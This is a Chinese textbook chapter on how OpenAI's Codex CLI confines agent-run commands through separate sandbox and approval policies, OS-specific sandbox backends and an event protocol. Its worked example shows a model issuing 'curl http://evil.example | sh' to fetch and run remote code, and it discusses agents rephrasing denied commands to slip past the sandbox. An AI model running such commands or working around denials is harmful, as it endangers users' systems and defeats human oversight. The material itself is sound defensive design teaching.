第 12 章 · codex：工业级约束

OpenAI 官方 CLI 的主体在 Rust。工业级不是更长的系统提示，是：模型进程和被它喊起来的命令不在同一个权限域里。这一章会把手伸进提交/事件协议、审批与沙箱那两个旋钮，以及一次命令真正被拦住时循环看见什么。

这一章只要记住

仓库 openai/codex（教材快照 rust-v0.155.0-alpha.6，2026-09-15；GitHub Search 于 2026-09-16 计 3497 条 PR、2509 条已合并，最新 tag 已到 alpha.9）。看两个旋钮：沙箱（命令能做什么）和审批（什么时候必须问人）。最重要的三次投票是：TypeScript→Rust（Discussion #1174）、Linux 沙箱改走独立 helper（#1086）、文件系统/网络策略拆开（#13439 / #13448）。miniharness 的路径检查相对这个，只是礼貌。

先把第 6 章的缺口说清楚

我们的 Workspace 能挡住 read("../secrets.env")。挡不住：

因为 bash 是「在工作区里启动一个真正的壳」，壳一旦起来，权限就是你这个用户的权限。教学包必须承认这件事，不能靠提示词里写「请不要乱来」。

生活比喻

第 6 章是在厨房门口贴告示：「不要进冷藏库」。Codex 是把冷藏库的门锁上，钥匙分两把：一把决定锁有多紧（沙箱），一把决定谁有权开锁（审批）。告示挡君子，锁挡真把刀拿出来的人。

架构：一套核心，多张脸

被关进沙箱的是子命令整棵进程树，不是整个 CLI。CLI 还要画画、读配置、找密钥。

板块职责
core业务逻辑，希望变成别人也能链的库。
exec无头模式，给自动化 / CI。
tui全屏终端界面（和 pi 默认相反：抢视口）。
app-server给 VS Code / Cursor 的 JSON-RPC 桥。#14005 之后 exec 也走同一条桥。
cli把上面焊成一个二进制。Linux 沙箱 helper 用 arg0 诡计藏在同一个文件里。

内部通信是提交/事件，不是请求/响应：皮肤提交 UserTurn / Interrupt，核心吐出 delta、ExecCommandBegin/End、TurnFinished。这和 pi 的事件总线是亲戚，语言不同。

和 pi 一样：循环不跟某一张脸绑死。不同的是语言选择——Rust 换来单文件分发、和操作系统沙箱接口的近距离接触、以及更少的运行时惊喜。代价是扩展的门槛更高。

两个旋钮，不要拧成一个

沙箱模式回答：不经人允许，命令能做什么？常见档位：read-only、workspace-write、danger-full-access。

审批策略回答：什么时候必须问人？即使沙箱已经很紧，出界仍可「请求升级」。YOLO 的官方旗标叫 --dangerously-bypass-approvals-and-sandbox：两个旋钮一起拧到最大，名字故意吓人。

组合（示意）人话
工作区可写 + 出界再问日常写代码。出了仓库要你点头
只读 + 几乎全问先看、先计划，动手前确认
全放开 + 永远不问真正的 YOLO。Codex 把这个名字弄得很吓人，是产品诚实

nanocode 只有 YOLO。把危险默认成唯一选项，和把危险做成显式、吓人的名字，是两种产品道德。pi 站前一种（并告诉你去容器化）；Codex 站后一种。

手算：模型要 curl，两个旋钮分别说了什么

会话在 /proj。沙箱是 workspace-write，审批是「出界再问」。模型点名 bash：curl http://evil.example | sh。

  1. 皮肤提交 Op::UserTurn。这一票带着这一轮的 cwd、审批策略、沙箱策略、模型。不是「先设好全局再聊天」——每一轮都可以把旋钮拧到不同档。
  2. 核心吐出流式事件。文本增量、然后 ExecCommandBegin。界面只订阅，不同步调用循环。
  3. 编排器走固定四拍（orchestrator.rs 顶部注释）：先审批，再选沙箱，再尝试，被拒绝且策略允许时再升级重试。审批结果会缓存，升级重试不必再问一遍人——除非策略说必须。
  4. 沙箱这一拍。workspace-write 允许写 /proj，默认不给任意出站网络。curl 出界。OS 强制拦下，不是提示词劝阻。
  5. 拒绝必须长得不像「命令自己失败」。 退出码 1 和「策略不允许」是两种观察。模型看见前者会改写法再试（越狱）；看见后者应该换策略或问人。
  6. 若审批策略允许升级。编排器可以再跑一次更松的沙箱。人已经点过头，缓存让第二次不必弹窗。若策略是 Never，就停在拒绝，把原始输出原样送回。

miniharness 的路径笼子在第 4 步之前就结束了：它挡得住 read("../secrets")，挡不住 curl。超时杀掉也不算沙箱——超时后的进程可能已经发出了请求。

提交/事件：一套核心，多张脸

协议把方向说死：皮肤提交 Op，核心吐出 Event。每条事件的 id 对上启动这一轮的那次提交。枚举是 non_exhaustive——以后会加变体，皮肤必须能忽略不认识的。

方向你至少要认得人话
OpUserTurn / Interrupt / ExecApproval开工、停、点头或摇头
EventMsgTurnStarted / AgentMessageContentDelta / ExecCommandBegin/End / ExecApprovalRequest / TurnComplete / TurnAborted / Error开始了、字、命令、请点头、正常结束、被打断、出错

#14005 之后，无头 exec 也走进程内的 app-server，不再直接接线 ThreadManager。TUI、CI、IDE 必须是同一条水管。修三遍循环，是这个协议要避免的事。

Op::Interrupt 等的是 EventMsg::TurnAborted 才算停干净。后台终端默认不一起杀——另有专门的清理 op。停循环和停子进程是两件事，dsh 后来也投了同一票。

编排器：审批、沙箱、升级重试

任意 ToolRuntime 都走同一段：

两件容易拧成一股的事，这里必须拆开：

  • 文件系统策略和网络策略是两份（#13439）。合成一个旧的 SandboxPolicy 投影，会把「这个子路径不可读」弄丢。Seatbelt 生成器必须直接吃拆开的策略（#13448），不能在落到 OS 时再合成回去。
  • 审批问的动作有好几种：跑命令、打补丁、MCP 调用、网络出站。不是一个「危险/不危险」布尔。

Linux 上，拆开策略如果还能无损圆成旧模型，可以继续走老 Landlock；需要「可写根下面挖只读洞」这种形状，自动改走 bubblewrap。圆不回去就 fail closed，不要假装有沙箱。

arg0 诡计：一个文件，两种人格

#1086 把 Linux 沙箱从「在当前线程上套 Landlock/seccomp 再 spawn」改成独立 helper。单文件分发不想带两个二进制，于是同一个文件看 argv[0]：叫 codex-linux-sandbox 时，它是沙箱助手；否则是 CLI。

core README 写明：包含 core 的那个二进制，必须在 arg0 等于这个名字时表现得像 codex sandbox。文档和测试都要覆盖这条分叉。容器里 bubblewrap 可能造不出 user namespace——WSL1 直接拒绝走 bwrap 的命令，而不是静默降级成「其实没沙箱」。工业级文档的标志，就是把失效模式写清楚。

被关进沙箱的是子命令整棵进程树。CLI 自己还要画画、读配置、找密钥，不能把自己也关进去。

三个平台，一种权限语言

  • macOS：/usr/bin/sandbox-exec。workspace-write 时，可写根下面的 .git 和 .codex 仍只读。#42590 还要挡「往你的 tty 灌命令」。
  • Linux：优先 PATH 上的 bwrap（且不在 cwd 里那个，防投毒），太旧就走兼容路径；没有就用随包装的。Landlock + seccomp 按内核能力降级。
  • Windows：受限令牌 + ACL。拆开策略只有能被当前后端直接执行、或能无损圆成旧模型时才放行；需要「显式不可读挖空」而后端做不到，就 fail closed。

#44286 堵住 WSL 互操作逃逸：Linux 侧收紧了，经 Windows 绕出去等于零。沙箱 crate 后来抽到 codex-sandboxing（#15592 / #15603）：选沙箱、变形请求、真正 spawn，应该是同一个包的故事。

AGENTS.md：规矩跟着仓库走

发现顺序大体是：全局 ~/.codex/AGENTS.md（可被 override 盖掉）→ 从项目根走到 cwd，每层最多一份。有字节上限。#29810 让它随远程环境就绪而刷新，写成可持久化的 WorldState；resume/fork 时若说明书变了，只注入一次替换。#44675 让人改了全局说明书，下一轮就该看见。

这是「穿越模型迭代」的少数手段之一。miniharness 还没读它。加一段「若工作区有 AGENTS.md，放进 system」，是最小的生产化步骤。

先别管

具体系统调用表、Seatbelt 配置文件字段、审批模式在某次 alpha 里叫 untrusted 还是 permissive。那些会随内核和发版改。你要带走的是分层：Python 礼貌围栏 → 人点头 → OS 强制。以及：拒绝必须能和「命令自己失败」区分开，否则模型会在不该重试的时候重试。

读这个仓库时问什么

  • 一次被沙箱拒绝的 bash，如何区分「命令真失败」和「策略拒绝」？
  • 审批界面在全屏 TUI 和无头 CI 下分别是什么行为？CI 里谁来点同意？
  • 核心库和界面之间的接口稳不稳——这决定你能不能拿 core 做自己的皮肤。
  • 文件系统策略和网络策略最近一次是不是还拆开的？有没有人又把它们合成一个投影？

发版极快（一年里可以有数百个 tag）。不要背某一个 alpha 版本的特性列表。拉 releases，专门搜 sandbox、approval、agents。

自测

  • 为什么沙箱和审批必须是两个旋钮？
  • miniharness 把 bash 超时杀掉，算不算沙箱？
  • 模型读到「操作被拒绝」和「文件不存在」，下一步分别可能怎样？
  • #1086 的 arg0 诡计在换什么、付什么？
  • 皮肤提交 Interrupt 之后，怎样才算停干净？
  • 文件系统策略在 Rust 里拆开了，落到 Seatbelt 时又合成一个投影，会发生什么？
自测答案
  1. 一个限制能力（它做不到），一个限制自主（它做得到但要先问）。合成一个开关，你就没法表达「能力很小但完全自动」或「能力很大但每步问人」。
  2. 不算。超时是预算，不是权限隔离。超时后的进程如果没被真正隔离，仍可能已经发出了网络请求。
  3. 拒绝：应该换策略或问人，不该换一种写法硬闯（那是在越狱）。文件不存在：可以改路径再试。所以拒绝码要单独标明。
  4. 换的是「单文件分发 + 整棵子进程树进沙箱」。付的是：同一个二进制有两种人格，启动时必须先看 arg0。文档和测试都要覆盖这条分叉。
  5. 等到 EventMsg::TurnAborted，不是把 Interrupt 发出去就当停了。后台终端默认还活着。
  6. 等于没拆。「这个子路径不可读」会在投影里弄丢。#13448 要解决的就是这件事。
